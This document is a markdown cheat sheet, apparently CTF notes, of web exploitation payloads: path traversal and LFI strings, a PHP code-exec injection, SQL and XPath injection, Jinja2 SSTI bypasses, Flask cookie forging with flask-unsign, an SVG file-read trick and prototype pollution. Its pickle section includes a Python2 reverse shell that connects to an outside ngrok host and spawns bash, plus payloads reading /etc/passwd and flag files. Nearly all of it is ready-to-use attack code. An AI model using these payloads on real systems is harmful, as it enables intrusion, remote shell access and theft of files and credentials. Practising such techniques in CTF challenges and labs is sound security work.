# Web

Payloads and tricks for common web exploitation tasks.

## Quick wins
- Test simple LFI/path traversal first; many challenges hide flags in `/etc/passwd` or app roots.
- When filters block characters, try URL encoding or alternate protocol wrappers.
- For SQLi, start with UNION-based extraction; for SSTI, pivot to filter bypasses (`attr`, `__getitem__`).

## Protocol/host tricks
- `file:///etc/passwd`
- Header override: `X-Forwarded-Host`

## Local File Inclusion (LFI)
- Common paths: `/robots.txt`, `/.git`, `/sitemap.xml`
- PHP filter: `?file=php://filter/convert.base64-encode/resource=/etc/passwd`
- Inline code exec: `?file='.system("cat /flag*").'`
- Proc env: `/../../../../../../proc/self/environ`
- Nuxt dev FS: `/_nuxt/@fs/flag.txt`
- Tomcat: `../../../../../../conf/tomcat-users.xml`

## Path traversal encodings
- `%2e%2e/` -> `../`
- `%2e%2e%2f` -> `../`
- `..%2f` -> `../`

## XSS
- LFI read via XHR:
  ```javascript
  <script>
    const x = new XMLHttpRequest();
    x.onload = function () { document.write(this.responseText); };
    x.open("GET", "file:///etc/passwd");
    x.send();
  </script>
  ```

## SQLi
- UNION basics:
  ```
  ' UNION SELECT current_database() --
  ' AND 1=0 UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS --
  ```

## XPath injection
```
'or string-length(name(.))=5 or '!'='
' or substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT) or '!'='
'or contains(.,'admin') or'
a' or (substring((//flag)[1],1,1))='a
```

## Type juggling / header play
- Custom User-Agent example:
  ```
  curl -H "User-Agent: SUPER SECRET AGENT" http://victim.com/
  ```
- Null-byte POST helper: https://github.com/ByamB4/CCC/blob/master/Web%20Exploitation/src/post-nullbyte.py

## Server-Side Template Injection (Python/Jinja2)
- When `.` and `[]` are filtered:
  - `obj.attribute` -> `obj|attr('attribute')`
  - `obj[index]` -> `obj|attr('__getitem__')(index)`
  - `obj['key']` -> `obj|attr('__getitem__')('key')`

## JWT
- Flask session cookie:
  - Decode: `flask-unsign --decode --cookie eyJsb2dnZWRfaW4iOmZhbHNlfQ.Yg9geQ.s8MKSRemMQyS5S60QTS0lY0Xg0o`
  - Brute secret: `flask-unsign --unsign --cookie < cookie.txt`
  - Re-sign: `flask-unsign --sign --cookie "{'logged_in': True}" --secret 'password'`
- Flask SSTI writeup: https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

## Python pickle RCE
- Simple RCE payload:
  ```python
  import pickle, base64, subprocess

  class DillPickle:
    def __reduce__(self):
      return (subprocess.check_output, (['/bin/cat', '/ls'],))

  print(base64.b64encode(pickle.dumps(DillPickle())).decode())
  ```
- Reverse shell (python2):
  ```python
  class RCE(object):
    def __reduce__(self):
      return (os.system,('python2 -c \"import os,pty,socket;s=socket.socket();s.connect((\\\"0.tcp.jp.ngrok.io\\\",13180));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\\"/bin/bash\\\")\"',))
  ```
- JSON coercion read:
  ```python
  class Exploit:
      def __reduce__(self):
          return (eval, ('{"name":"name","userid":"1234","password":open(\"./flag.txt\").read()}',))
  ```

## ImageMagick file read (XXE)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg width="500px" height="500px">
  <image width="500" height="500" href="text:/etc/passwd" />
</svg>
```

## Prototype pollution
- Lodash examples:
  - `{"constructor": {"prototype": {"admin": True}}}`
  - `{"__proto__": {"name": "user", "password": "pass", "admin": True}}`
